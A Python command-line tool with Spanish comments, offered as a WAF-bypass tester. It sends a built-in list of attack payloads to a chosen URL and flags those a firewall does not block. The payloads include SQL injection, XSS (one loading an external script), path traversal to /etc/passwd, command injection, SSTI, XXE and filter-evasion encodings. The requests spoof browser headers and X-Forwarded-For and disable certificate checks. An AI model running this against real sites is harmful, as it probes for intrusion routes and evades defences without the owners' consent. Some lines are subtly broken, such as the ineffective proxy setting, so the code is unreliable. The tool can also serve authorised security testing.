#!/usr/bin/env python3
import requests
import sys
import argparse
from urllib.parse import quote, urlparse

# Configuración de user-agent para parecer un navegador real
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

def load_payloads_from_file(filename="payloads.txt"):
    """Carga payloads desde un archivo"""
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"[!] Archivo {filename} no encontrado. Usando payloads por defecto.")
        return None

def test_payload(url, payload, method="GET", param="test"):
    """Prueba un payload específico"""
    try:
        encoded_payload = quote(payload, safe='')
        
        if method.upper() == "GET":
            # Variaciones de encoding
            test_urls = [
                f"{url}?{param}={encoded_payload}",  # URL encoded
                f"{url}?{param}={payload}",          # Sin encode
                f"{url}?{param}={quote(payload)}",   # Full encode
            ]
            
            # Prueba con diferentes headers
            headers_variations = [
                HEADERS,
                {**HEADERS, 'X-Forwarded-For': '127.0.0.1'},
                {**HEADERS, 'Content-Type': 'application/x-www-form-urlencoded'},
            ]
            
            for test_url in test_urls:
                for headers in headers_variations:
                    r = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    
                    if r.status_code in [403, 406, 501] or "WAF" in r.text.upper() or "blocked" in r.text.lower():
                        return "BLOCKED", r.status_code
                        
        elif method.upper() == "POST":
            data = {param: payload}
            r = requests.post(url, data=data, headers=HEADERS, timeout=10, verify=False)
            
            if r.status_code in [403, 406, 501] or "WAF" in r.text.upper() or "blocked" in r.text.lower():
                return "BLOCKED", r.status_code
                
        return "PASSED", r.status_code if 'r' in locals() else 0
        
    except Exception as e:
        return f"ERROR: {str(e)}", 0

def main():
    parser = argparse.ArgumentParser(description='Herramienta de prueba WAF bypass')
    parser.add_argument('-u', '--url', required=True, help='URL objetivo')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='Método HTTP')
    parser.add_argument('-p', '--param', default='test', help='Parámetro a probar')
    parser.add_argument('-f', '--file', help='Archivo con payloads personalizados')
    parser.add_argument('--proxy', help='Usar proxy (ej: http://127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    # Cargar payloads
    if args.file:
        payloads = load_payloads_from_file(args.file)
    else:
        # Payloads más completos para diferentes tipos de ataques
        payloads = [
            # SQL Injection básico
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' ORDER BY 1--+",
            "1' UNION SELECT 1,2,3--+",
            "' UNION SELECT NULL,NULL--",
            
            # XSS básico
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            
            # Path Traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            # Command Injection
            "; ls -la",
            "| dir",
            "`whoami`",
            "$(id)",
            
            # SSTI
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            
            # XXE
            "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
            
            # Encoding variations
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;",
            
            # WAF evasion techniques
            "/**/OR/**/1=1",
            "UNION%0ASELECT%0A1,2,3",
            "'+OR+1=1--",
            "'/*!50000OR*/1=1--",
            
            # Case variation
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
            
            # Null bytes
            "../../../etc/passwd%00",
            "<script>alert(1)</script>%00",
            
            # Unicode bypass
            "∕⁄script⁄alert⁦1⁩∕⁄script⁄",
            
            # HTML entities
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            
            # Double encoding
            "%252e%252e%252fetc%252fpasswd",
            
            # UTF-8 encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            
            # SQL comments variations
            "' OR 1=1#",
            "' OR 1=1-- -",
            "' OR 1=1/*",
            "'/**/OR/**/1/**/=/**/1",
            
            # Time-based SQL
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5(1))--",
            
            # Boolean-based SQL
            "' OR 1=1 AND 'a'='a",
            "' OR 'a'='a' AND 'a'='a",
        ]
    
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
        requests.proxies = proxies
    
    print(f"[*] Probando WAF en: {args.url}")
    print(f"[*] Método: {args.method}")
    print(f"[*] Parámetro: {args.param}")
    print(f"[*] Número de payloads: {len(payloads)}")
    print("=" * 60)
    
    bypass_found = False
    results = []
    
    for i, payload in enumerate(payloads, 1):
        print(f"[{i}/{len(payloads)}] Probando: {payload[:50]}...", end=' ')
        
        result, status = test_payload(args.url, payload, args.method, args.param)
        
        if result == "PASSED":
            print(f"✅ [POSSIBLE BYPASS] (Status: {status})")
            results.append((payload, "POSSIBLE BYPASS", status))
            bypass_found = True
        elif result == "BLOCKED":
            print(f"❌ [BLOCKED] (Status: {status})")
            results.append((payload, "BLOCKED", status))
        else:
            print(f"⚠️  [{result}]")
            results.append((payload, result, status))
    
    print("\n" + "=" * 60)
    print("[*] RESUMEN DE RESULTADOS")
    print("=" * 60)
    
    for payload, result, status in results:
        if result == "POSSIBLE BYPASS":
            print(f"✅ BYPASS: {payload}")
    
    if not bypass_found:
        print("[!] No se encontraron posibles bypass")
    else:
        print(f"\n[+] Se encontraron {len([r for r in results if r[1] == 'POSSIBLE BYPASS'])} posibles bypasses")

if __name__ == "__main__":
    main()
